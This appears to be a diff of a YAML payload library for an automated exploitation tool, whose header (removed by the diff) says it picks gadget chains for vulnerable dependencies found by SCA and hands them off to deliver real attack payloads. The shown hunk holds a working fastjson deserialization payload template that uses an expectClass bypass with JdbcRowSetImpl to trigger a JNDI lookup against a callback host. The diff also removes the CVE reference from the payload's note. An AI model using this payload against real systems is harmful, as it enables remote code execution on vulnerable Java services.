@@ -1,4 +1,3 @@
-# SCA 驱动选弹弹药库（方案 A/C 的骨架，2026-08-29）
 #
 # 用途：SCA 检出「依赖里有漏洞版本的库」后，按 (family, ecosystem, package, version_range)
 #       查出该库在当前版本下**可用的 gadget 链**，交给 D1 投放真实攻击载荷。
@@ -221,7 +220,7 @@ chains:
     version_range: ">=1.2.48,<=1.2.82"
     template: '{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{callback}","autoCommit":true}'
     priority: 55
-    notes: "expectClass 绕过面（CVE-2022-25845，≤1.2.82，2026-10-02 补齐）：以 AutoCloseable 作 expectClass 指定 JdbcRowSetImpl 触发 JNDI；须目标未开 safeMode（1.2.68 起可选加固，默认关），选弹前须过机制表 mechanism_library 的 check_depends 与自写净化器求交，验证走 OOB"
+    notes: "expectClass 绕过面：以 AutoCloseable 作 expectClass 指定 JdbcRowSetImpl 触发 JNDI；须目标未开 safeMode（1.2.68 起可选加固，默认关），选弹前须过机制表 mechanism_library 的 check_depends 与自写净化器求交，验证走 OOB"
 
   - id: jackson-defaulttyping
     kind: text
